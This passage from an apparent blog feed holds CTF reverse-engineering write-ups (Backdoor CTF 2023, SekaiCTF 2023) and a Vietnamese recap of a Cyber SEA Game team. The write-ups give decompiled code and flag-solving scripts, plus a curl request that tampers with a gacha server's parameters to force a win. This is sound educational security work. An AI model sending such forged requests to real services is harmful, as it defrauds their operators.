+= chr(v12[v6] ^ (v6 + 17)) v6 += 1 print(v8) # v8 = \u0026#34;SeventeenChars!!!\u0026#34; The other side:\n1 2 3 std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9,\u0026#34;ThatsHardcoded!!!\u0026#34;,\u0026amp;v5); we have v9 = \u0026quot;ThatsHardcoded!!!\u0026quot;\n1. func_5\nfunc_5 is a joke hix :((( so we can ignore it (not related to the program flow), if you want decode func_5, here is raw data dumped from IDA and script\n2. func_4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall func_4(__int64 a1, __int64 a2) { unsigned __int64 i; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+20h] [rbp-10h] __int64 v5; // [rsp+28h] [rbp-8h] v4 = std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::size(a1); v5 = operator new[](0x44uLL); for ( i = 0LL; i \u0026lt; v4; ++i ) *(v5 + 4 * i) = (*(a2 + i) ^ *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[]( a1, i)); return v5; } 3. func_3\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall func_3(__int64 a1, __int64 a2) { int i; // [rsp+14h] [rbp-Ch] __int64 v4; // [rsp+18h] [rbp-8h] v4 = operator new[](0x44uLL); for ( i = 0; i \u0026lt;= 16; ++i ) *(4LL * i + v4) = *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](a2, i) ^ *(4LL * i + a1); return v4; } 4. func_2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 _BOOL8 __fastcall func_2(int *a1) { return *a1 == 78 \u0026amp;\u0026amp; a1[1] != (*a1 == 15) \u0026amp;\u0026amp; a1[2] == 120 \u0026amp;\u0026amp; a1[3] != (a1[2] == 31) \u0026amp;\u0026amp; a1[4] == 120 \u0026amp;\u0026amp; a1[5] != (a1[4] == 11) \u0026amp;\u0026amp; a1[6] == 116 \u0026amp;\u0026amp; a1[6] != (a1[7] == 6) \u0026amp;\u0026amp; a1[8] == 100 \u0026amp;\u0026amp; a1[9] != (a1[8] == 33) \u0026amp;\u0026amp; a1[10] == 99 \u0026amp;\u0026amp; a1[11] != (a1[10] == 34) \u0026amp;\u0026amp; a1[12] == 120 \u0026amp;\u0026amp; a1[13] == a1[12] \u0026amp;\u0026amp; a1[14] == 114 \u0026amp;\u0026amp; a1[15] == a1[14] + 1 \u0026amp;\u0026amp; a1[16] == 33; } so here is logic of func_3 \u0026amp; func_4:\n1 2 3 4 5 6 7 8 9 10 11 12 def func_4(a1, a2): v4 = len(a1) v5 = bytearray() for i in range(v4): v5.append((ord(a2[i]) ^ ord(a1[i])) % 256) return v5 def func_3(a1, a2): v4 = [0]*17 for i in range(17): v4[i] = ord(a2[i]) ^ a1[i] return v4 So we can find a1 to func_2 is True with z3 python then we can use func_3, func_4 to find key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from z3 import * flags = [BitVec(f\u0026#39;char_{i}\u0026#39;, 8) for i in range(17)] unk1 = [BitVec(f\u0026#39;z1_{i}\u0026#39;, 8) for i in range(17)] s = Solver() s.add(len(flags) == 17) for i in range(17): s.add(And(flags[i] \u0026gt;= 33, flags[i] \u0026lt;= 125)) str1 = \u0026#34;SeventeenChars!!!\u0026#34; str2 = \u0026#34;ThatsHardcoded!!!\u0026#34; for i in range(17): unk1[i] = flags[i] ^ ord(str1[i]) for i in range(17): unk1[i] = unk1[i] ^ BitVecVal(ord(str2[i]), 8) condition = And( unk1[0] == 78, unk1[1] != If(unk1[0] == 15, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[2] == 120, unk1[3] != If(unk1[2] == 31, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[4] == 120, unk1[5] != If(unk1[4] == 11, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[6] == 116, unk1[7] != If(unk1[6] == 6, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[8] == 100, unk1[9] != If(unk1[8] == 33, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[10] == 99, unk1[11] != If(unk1[10] == 34, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[12] == 120, unk1[13] == unk1[12], unk1[14] == 114, unk1[15] == unk1[14] + 1, unk1[16] == 33 ) s.add(condition) if s.check() == sat: m = s.model() flag = \u0026#39;\u0026#39;.join([chr(m[flags[i]].as_long()) for i in range(17)]) print(f\u0026#34;Pass: {flag}\u0026#34;) else: print(\u0026#34;No solution found!\u0026#34;) # Pass: I$o0e!p0n0d0oors! When i put it like as argv it false:\nI think $ in the key is special character in Linux, so i edit this command from ./chall.out I$o0e!p0n0d0oors! to ./chall.out $(echo SSRvMGUhcDBuMGQwb29ycyE= | base64 -d) and here is the flag:\nbaby eBPF Attachment: babyebpf.o\neBPF (extended Berkeley Packet Filter) is a technology in the Linux kernel that allows the execution of custom programs within the kernel itself. These programs are typically used for monitoring and filtering network events and can be attached to various hook points in the kernel.\nIn this chall, we must use process EBPF from https://github.com/zandi/eBPF_processor to dissasemble this file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 detect_execve: mov r1, 0x1C050444 stxw [r10-8], r1 lddw r1, 0x954094701340819 stxdw [r10-0x10], r1 lddw r1, 0x10523251403E5713 stxdw [r10-0x18], r1 lddw r1, 0x43075A150E130D0B stxdw [r10-0x20], r1 mov r1, 0 LBB0_1: lddw r2, 0 add r2, r1 ldxb r2, [r2] mov r3, r10 add r3, -0x20 add r3, r1 ldxb r4, [r3] xor r2, r4 stxb [r3], r2 add r1, 1 jeq r1, 0x1C, LBB0_2 ja LBB0_1 -------------------------------------- LBB0_2: mov r3, r10 add r3, -0x20 lddw r1, 0x1C mov r2, 4 call 6 mov r0, 1 ret -------------------------------------- szmarinkitagawa:db \u0026#34;marinkitagawamarinkitagawama\u0026#34;,0 This is simple assembly code, so I have the script to get the flag, notice that the key is marinkitagawamarinkitagawama:\n1 2 3 4 5 6 7 8 9 10 11 key = \u0026#34;marinkitagawamarinkitagawama\u0026#34; data = [ 0x1C050444, 0x954094701340819, 0x10523251403E5713, 0x43075A150E130D0B ] rote = [((value \u0026gt;\u0026gt; i) \u0026amp; 0xFF) for value in reversed(data) for i in range(0, 64, 8)] flag = \u0026#39;\u0026#39;.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(rote)) print(flag) # flag{1n7r0_70_3bpf_h3h3h3eh}mari or we can guess easily xor with length of key and data xD\nSl4ydroid Attachment: sl4ydroid.apk like the Open Sesame challenge, we will use Decompiler.com to decompile this apk\nIn this challenge, during the ctf, I only completed 3/4 of flag, which is quite unfortunate\nI use jadx to decompile this apk and export lib because nothing java usefull in source :\u0026laquo;\nWhen i load libsl4ydroid.so to IDA, the first function i see RC4 hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 int __stdcall firsts(int a1) { unsigned int v1; // eax unsigned int v2; // eax int v4; // [esp+10h] [ebp-58h] int v5; // [esp+18h] [ebp-50h] char v6; // [esp+1Fh] [ebp-49h] unsigned int i; // [esp+30h] [ebp-38h] char v8[16]; // [esp+40h] [ebp-28h] BYREF char v9[16]; // [esp+50h] [ebp-18h] BYREF unsigned int v10; // [esp+60h] [ebp-8h] v10 = __readgsdword(0x14u); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(a1, \u0026#34;b5)c]d/ZP1:\\\u0026#34;\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v9, \u0026#34;R00rkee\u0026#34;); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v8, \u0026#34;R1zz\u0026#34;); for ( i = 0; i \u0026lt;= sub_1AC20(a1) - 1; ++i ) { v4 = *sub_1AC50(a1, i); v1 = sub_1AC20(v9); v5 = *sub_1AC50(v9, i % v1) ^ v4; v2 = sub_1AC20(v8); v6 = *sub_1AC50(v8, i % v2) ^ v5; *sub_1AC50(a1, i) = v6; } std::string::~string(v8); std::string::~string(v9); return a1; } when i convert it to python and run, i receive b4ckd00r2023, so it will be RC4\n1. Java_com_backdoor_sl4ydroid_MainActivity_kim\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_kim(_JNIEnv *a1, int a2, int a3) { _BYTE *v3; // eax const char *v4; // eax int v6; // [esp+34h] [ebp-64h] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v9; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v11[8]; // [esp+58h] [ebp-40h] BYREF char v12[8]; // [esp+60h] [ebp-38h] BYREF char v13[16]; // [esp+68h] [ebp-30h] BYREF char v14[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v15; // [esp+88h] [ebp-10h] v15 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v14, \u0026amp;s1, \u0026amp;us3_m3); v9 = sub_1BCB0(v14); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v9, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v13, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); sub_1B850(v12); sub_1B8A0(v11); while ( (sub_1B910(v12, v11) \u0026amp; 1) != 0 ) { v3 = sub_1B950(v12); *v3 += 8; *v3 ^= 7u; sub_1B960(v12); } v4 = sub_1BCB0(v13); v6 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v6); _JNIEnv::DeleteLocalRef(a1, v6); std::string::~string(v13); std::string::~string(v14); return __readgsdword(0x14u); } Here is simple encrypt with +8 and ^7 so i use script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def encrypt_string(input_str, key): result = bytearray() for i in range(len(key)): encrypted_char = (ord(key[i]) + 8) ^ 7 result += encrypted_char.to_bytes(1, byteorder=\u0026#34;little\u0026#34;) return result k1 = \u0026#34;Yc^XtMfu\u0026#34; m1 = \u0026#34;d23ba52679c5e1\u0026#34; encrypted_result = encrypt_string(m1, k1) print(\u0026#34;Encrypted Result:\u0026#34;, encrypted_result.hex()) # 666c61677b52697a --\u0026gt; flag{Riz 2. Java_com_backdoor_sl4ydroid_MainActivity_damn\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_damn(_JNIEnv *a1, int a2, int a3) { int v3; // eax const char *v4; // eax char v6; // [esp+27h] [ebp-71h] int v7; // [esp+38h] [ebp-60h] int i; // [esp+3Ch] [ebp-5Ch] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v11; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v13[16]; // [esp+58h] [ebp-40h] BYREF char v14[16]; // [esp+68h] [ebp-30h] BYREF char v15[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v16; // [esp+88h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r1, \u0026amp;us3_m3); v11 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v11, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); std::string::basic_string(v13, v14); for ( i = sub_1AC20(v13) - 1; i \u0026gt;= 0; --i ) { v6 = *sub_1AC50(v13, i) ^ 0xC; v3 = sub_1AC20(v14); *sub_1AC50(v14, v3 - 1 - i) = v6; } v4 = sub_1BCB0(v14); v7 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v7); _JNIEnv::DeleteLocalRef(a1, v7); std::string::~string(v13); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here is simple xor with 0xC and reverse strings\n1 2 3 4 5 6 7 8 9 10 11 12 def damn(k3): v14 = k3 for i in range(len(k3)-1, -1, -1): v6 = ord(k3[i]) ^ 0xC v14 = v14[:len(k3)-1-i] + chr(v6) + v14[len(k3)-1-i+1:] return v14 k3 = \u0026#34;~?z?^S8o\u0026#34; result = damn(k3) print(result) # c4_R3v3r 3. Java_com_backdoor_sl4ydroid_MainActivity_k2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_k2(_JNIEnv *a1, int a2, int a3) { unsigned int v3; // eax const char *v4; // eax char v6; // [esp+1Ch] [ebp-6Ch] char v7; // [esp+23h] [ebp-65h] int v8; // [esp+38h] [ebp-50h] unsigned int i; // [esp+3Ch] [ebp-4Ch] int StringUTFChars; // [esp+40h] [ebp-48h] int MethodID; // [esp+4Ch] [ebp-3Ch] int v12; // [esp+50h] [ebp-38h] int ObjectClass; // [esp+54h] [ebp-34h] char v14[16]; // [esp+58h] [ebp-30h] BYREF char v15[16]; // [esp+68h] [ebp-20h] BYREF unsigned int v16; // [esp+78h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r2, \u0026amp;us3_m3); v12 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v12, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); for ( i = 0; i \u0026lt;= sub_1AC20(v14) - 1; ++i ) { v6 = *sub_1AC50(v14, i); v3 = sub_1AC20(\u0026amp;v2); v7 = *sub_1AC50(\u0026amp;v2, i % v3) ^ v6; *sub_1AC50(v14, i) = v7; } v4 = sub_1BCB0(v14); v8 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v8); _JNIEnv::DeleteLocalRef(a1, v8); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here use RC4 with %v2 corresponds to m2\n1 2 3 4 5 6 7 8 9 10 11 k4 = \u0026#34;xP78V`m?3XeL\u0026#34; r = b\u0026#34;\u0026#34; m2 = \u0026#34;May_1??\u0026#34; for i in range(len(k4)): ra = ord(m2[i % len(m2)]) ^ ord(k4[i]) r += ra.to_bytes(2, byteorder=\u0026#34;little\u0026#34;) print(r.replace(b\u0026#34;\\x00\u0026#34;,b\u0026#34;\u0026#34;)) # b\u0026#39;51Ngg_RrR!:}\u0026#39; I receive flag{Riz....c4_R3v3r51Ngg_RrR!:} and stuck with ring function in Java_com_backdoor_sl4ydroid_MainActivity_nim.\nWe can use gdb to debug this function \u0026amp; get script\n1 2 3 4 5 6 7 8 9 x = \u0026#34;yeahh\u0026#34; k2 = \u0026#34;0,S[)\u0026#34; flag2 = \u0026#34;\u0026#34; for i in range(len(k2)): flag2+= chr(ord(x[i]) ^ (ord(k2[i]) ^ 0x13)) print(flag2) # ZZ! R flag: flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}\nIt\u0026rsquo;s a pity because this challenge is\u0026rsquo;t hard hix :((. We can use log in Android Studio to check flag easily xDDD (From Vietzett)\n","date":"2023-12-18T00:00:00Z","image":"/p/backdoor-ctf-2023-reverse-engineering/featured_hu1633d773772b68a8a46d663a367faa24_195597_120x120_fill_box_smart1_3.png","permalink":"/p/backdoor-ctf-2023-reverse-engineering/","title":"Backdoor CTF 2023 | Reverse Engineering"},{"content":"Post này chỉ để kể câu chuyện đội mình đi thi Cyber SEA Game 2023 tại Bangkok, Thailand (9-10/11/2023)\nCyber SEA Game 2023 (Bangkok - Thailand) Tổng quan về cuộc thi của đội Việt Nam Trong 5 phút đầu tiên, khi team Việt Nam nhận server và tài khoản cũng như thực hiện các thao tác về đổi mật khẩu và kiểm tra, chúng tôi ngạc nhiên khi thấy có tới 6 team khác đã lần lượt submit các chủ đề, nhưng chưa rõ điều gì đã xảy ra.\nCác thành viên trong đội tự quản lý khối lượng công việc một cách rõ ràng, mặc dù hơi tiếc rằng Huy và Thành, chuyên sâu về Binary và Web Exploitation, lại không có chủ đề nào liên quan đến sở trường của họ. Cụ thể:\nViệt Anh đảm nhận Cryptography và Network Hoàng Huy chịu trách nhiệm cho Hacking Challenge 1 Thái Sơn thực hiện các nhiệm vụ OSINT, Steganography, Forensic, Reversing, và Memory Chí Thành đảm nhiệm Hacking Challenge 2. Chúng tôi cảm thấy áp lực khi đội Singapore thực hiện nhanh chóng và hoàn thành trong thời gian ngắn. Tuy nhiên, RobinHust không nản chí và cố gắng hết mình để hoàn thành các thách thức của mình. Đặc biệt, các thách thức không chỉ đòi hỏi sử dụng các kỹ thuật tấn công cơ bản mà còn đòi hỏi sự sáng tạo và \u0026ldquo;cảm nhận từ giác quan\u0026rdquo; (hay còn gọi 1 cách khác là bruteforce :3):\nTrong bài Flag #03: Cracking a Zip File của chủ đề Cryptography, có một yêu cầu là phải giải mã mật khẩu openthesamesenovemberXXXX, và việc bruteforce 4 ký tự cuối có thể mất một khoảng thời gian (theo lời giải chính thức đến từ BTC). Tuy nhiên, thông qua khả năng suy luận, chúng tôi đã thử nghiệm thành công với 4 ký tự cuối là 2023, giúp quá trình trở nên nhanh chóng và dễ dàng\nHoàng Huy tấn công thành công Hacking Challenge 1, liên tục vượt qua các thách thức. Team Việt Nam đã thể hiện khả năng xuất sắc trong việc giải quyết thử thách này nhờ đọc kỹ tài liệu từ BTC và thử nghiệm trước.\nThái Sơn đã xử lý thành công các thử thách về Steganography, Memory, Reversing và mở các thử thách Forensic.\nThành đã chuyển sang hỗ trợ Sơn và Việt Anh trong các thử thách Forensic và Crypto, sau đó quay trở lại cùng Hoàng Huy để giải quyết Hacking Challenge 2.\nMọi thứ diễn ra mượt mà và suôn sẻ, đội đã hoàn thành toàn bộ các thách thức trong vòng 3 tiếng 30 phút.\nTrong cuộc thi, hầu hết các đội đều có tỉ lệ submit sai khá lớn cùng 1 lượng thời gian lãng phí quá nhiều vì phải đoán trong thử thách Flag #03 Initial execution của chủ đề điều tra số Forensic đưa ra 1 danh sách khá nhiều những flag giả mà chúng tôi phải thử để giải quyết\nPhase 1: khởi đầu của cuộc thi (Khoảng 1 tiếng từ sau khi cuộc thi bắt đầu) Đội của chúng tôi khởi đầu không mấy thuận lợi khi trở thành đội chậm nhất trong số 10 đội giải quyết thử thách đầu tiên.\nCác đội khác bắt đầu submit từng thử thách từ 12:00 và đến tận 12:22 team Việt Nam mới submit được challenge đầu của Việt Anh (Thật sự khâm phục các thành viên trong đội vì giữ được sự bình tĩnh đến không ngờ)\nSau đó các thành viên lần lượt submit các bài đầu tiên của từng chủ đề (tới lúc này vẫn giữ vị trí cuối bảng do các đội khác đã submit rất nhiều các thử thách khác từ trước đó một lúc)\nPhase 2: mid game (Khoảng 2 tiếng từ sau khi cuộc thi bắt đầu) Sau khi bị mắc kẹt ở những thử thách ban đầu, đội của chúng tôi đã khôi phục được phong độ và thành công trong việc giải quyết các thách thức tiếp theo một cách nhanh chóng.\nBứt tốc lần 1: sau khoảng 30 phút kể từ khi giải được challenge đầu tiên, team đã bứt tốc từ vị trí cuối bảng lên vị trí 6, bị dẫn trước bởi các team Singapore, Malaysia, Thái, Brunei và Myanmar\nSau hơn một giờ diễn ra cuộc thi, đội Singapore đã gây ấn tượng khi hoàn thành tất cả các thử thách, kèm theo việc lắc chuông mỗi khi \u0026ldquo;clear\u0026rdquo; một chủ đề nào đó. Lúc này, tâm lý của đội chúng tôi có chút \u0026ldquo;sốc\u0026rdquo;, nhưng đã nhanh chóng ổn định tinh thần và tiếp tục vượt qua mọi thách thức.\nBứt tốc lần 2: Khoảng 1 giờ 45 phút đến 2 giờ sau khi cuộc thi bắt đầu, đội của chúng tôi liên tục giải quyết các thử thách về Crypto, Hacking Challenge 1 và Forensic. Việc này giúp đội chúng tôi vượt qua đội Thái Lan, đồng thời chiếm top 3 trên Bảng xếp hạng, chỉ đứng sau đội Singapore và Malaysia.\nPhase 3: End game Bứt tốc lần 3: Sau một thời gian dài bế tắc ở các thách thức Forensic và Hacking Challenge 2 bởi độ guessing của chúng, bằng thiên phú \u0026ldquo;bruteforce\u0026rdquo; của các thành viên, đội của chúng tôi cuối cùng cũng vượt qua khó khăn, giải quyết một lượt toàn bộ các thử thách Forensic (tới lúc này Thái Sơn gần như đã thuộc toàn bộ source của 7 thử thách Forensic vì luẩn quẩn ở đây quá lâu 🤣)\nChốt hạ Cyber SEA Game 2023 với Việt Nam là thử thách cuối của Hacking Challenge 2 bằng cú submit của Hoàng Huy. Điều này giúp chúng tôi vượt qua đội Malaysia, trở thành đội thứ hai giải toàn bộ các thử thách, sau gần 4 tiếng đồng hồ.\nP/s: Sau đó khoảng 1 tiếng thì đội thứ 3 là Team Thailand cũng hoàn thành toàn bộ thử thách và BTC đã có thể định ra 3 đội trao Nhất, Nhì, Ba của toàn giải Cyber SEA Game.\nBảng xếp hạng Trao Giải Tuy có chút tiếc nuối về việc không đạt được chiếc cúp vô địch của Cyber SEA Game nhưng Nu_RobinHust cũng rút ra được bài học rất lớn về việc chuẩn bị kỹ càng mọi thứ trước khi tham gia 1 cuộc thi cũng như sự bình tĩnh khi gặp các khó khăn đột ngột.\nĐây sẽ là bước tiến rất lớn cho team cũng như Đại học Bách khoa Hà Nội, chúng mình cũng sẽ lấy đó làm kinh nghiệm và động lực để phát triển bản thân mình trong tương lai.\n","date":"2023-11-10T00:00:00Z","image":"/p/cyber-sea-game-2023-recap/featured_hu59a906ccfb75fefec7be147e7f623c55_262995_120x120_fill_box_smart1_3.png","permalink":"/p/cyber-sea-game-2023-recap/","title":"Cyber SEA Game 2023 | Recap"},{"content":"Unfortunately, during the tournament, I was tricked into debugging the Teyvat Travel Guide challenge, which led me to go the wrong way and give up while making myself feel like I had no hope (when it was really only at medium level):\u0026lt; and lost. Quite a bit of effort for the Guardians of the Kernel challenge\nAzusawa’s Gacha World Author: enscribe\n❖ Note The website only contains the challenge description, and is not needed to solve the challenge.\nChallenge structure analysis In the first challenge, I received a full folder of Sekai\u0026rsquo;s Gacha game (Created by Unity)\nWhile searching through folders, I found a file named Assembly-CSharp.dll\nKnowing it was related to Csharp, I loaded it into DnSpy to get started. Luckily, this file is not too complicated, the information is clear.\n1. Character\n2. GachaRequest\n3. GachaResponse\nReading these 3 classes, I concluded that when I gacha, I will send the parameters in GachaRequest including crystals, pulls and numPulls to the server and receive GachaResponse containing the class character and which includes flag\nWhere does the server receive requests? 4. CreateGachaWebRequest\n1 2 3 4 5 6 7 8 9 10 11 12 13 // GachaManager // Token: 0x06000016 RID: 22 RVA: 0x0000259C File Offset: 0x0000079C private UnityWebRequest CreateGachaWebRequest(string json) { byte[] bytes = Encoding.UTF8.GetBytes(json); string s = \u0026#34;aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh\u0026#34;; UnityWebRequest unityWebRequest = new UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), \u0026#34;POST\u0026#34;); unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes); unityWebRequest.downloadHandler = new DownloadHandlerBuffer(); unityWebRequest.SetRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); unityWebRequest.SetRequestHeader(\u0026#34;User-Agent\u0026#34;, \u0026#34;SekaiCTF\u0026#34;); return unityWebRequest; } aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh là mã hoá base64 của http://172.86.64.89:3000/gacha\nYah, so I have found a server + some payload setup, here I can solve it with burpsuite or send it via shell :\u0026raquo;, I choose via shell for convenience\nP/s: There is also an option for game-style challs like this: Cheat Engine is quite simple, it can determine the exact address of the objects and modify them (in this writeup I will not mention it because it is not pure REV)\nGacha time So, based on what I analyze, I can write a shell curl to retrieve data like I\u0026rsquo;m gacha with the example parameters being 1000, 1, 1. (ie I have 1000 diamonds, new spin 1 time and spin 1 more time)\n1 curl -s -X POST http://172.86.64.89:3000/gacha -d \u0026#39;{\u0026#34;crystals\u0026#34;:1,\u0026#34;pulls\u0026#34;:1,\u0026#34;numPulls\u0026#34;:1}\u0026#39; -H \u0026#39;Content-type: application/json\u0026#39; -H \u0026#39;User-Agent: SekaiCTF\u0026#39; | jq . Maybe I still need to open the game to check what the parameters are\nYah, here it is, the chance of winning gacha is 0% and can only be received when spinning 1 million times :)). So it\u0026rsquo;s simple, because the number of spins per request is only between 1 and 10, so setup pulls will be 999999 and numPulls will be 1, and crystals will be set to 1000.\nPut the jumbled part into cyberchef with base64 and convert it to an image\nflag: SEKAI{D0N7_73LL_53G4_1_C0P13D_7H31R_G4M3}\nGuardians of the Kernel Author: Iyed\n❖ Note It’s just a warmup but with another layer which is the kernel.\nChallenge analysis In this chall, I received an attachment consisting of 2 quite strange files\nAfter researching, I understand that bzImage is a kernel image file that loads and initializes the kernel while booting the system and the .cpio file is like a file system restorer (because it manages data structures and file lists)\nSo I can completely build the kernel image (here I can use qemu), but this build chall is a bit redundant (I don\u0026rsquo;t need debug).\nWe an easily run this kernel with the command:\n1 qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio -nographic -monitor none -no-reboot -append \u0026#34;console=ttyS0\u0026#34; Instead, I decompress the files in initramfs.cpio with the command: cpio -idv -F inittramfs.cpio\nNotice that there is a file flag_checker.ko (this file contains information about loading modules into the kernel), so maybe I won\u0026rsquo;t need to debug through the kernel anymore, I\u0026rsquo;ll just load it into IDA\nGreat, there is device_ioctl that handles I/O Control, so I exploited this part and bonus\nThe main stream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 __int64 __fastcall device_ioctl(__int64 a1, int a2, __int64 a3) { __int64 result; // rax unsigned __int8 *v6; // rax int v7; // edx int v8; // eax unsigned int v9; // eax __int64 v10; // rdx if ( a2 == 28673 ) { if ( !layers[1] ) return 0LL; if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } return -14LL; } if ( a2 == 28674 ) { if ( !layers[2] ) return 0LL; v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } return -14LL; } if ( a2 != 28672 ) { printk(\u0026amp;unk_302, a3); return 0LL; } if ( copy_from_user(buffer, a3, 6LL) ) return -14LL; if ( *(_DWORD *)buffer != 1095451987 || *(_WORD *)\u0026amp;buffer[4] != 31561 ) return 0LL; printk(\u0026amp;unk_2B6, a3); result = 1LL; layers[1] = 1; return result; } As in the text view, we can see that the format of the flag is SEKAI{, then that is the end of the stream \u0026lt;\u0026ndash; Change the value from dec to char for clearer display\n1 if ( *(_DWORD *)buffer != \u0026#39;AKES\u0026#39; || *(_WORD *)\u0026amp;buffer[4] != \u0026#39;{I\u0026#39; ) Processing layer 1 Maybe this is the part that takes up all my time during the tournament :)))), being lazy should be punished by God :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 if ( !copy_from_user(buffer, a3, 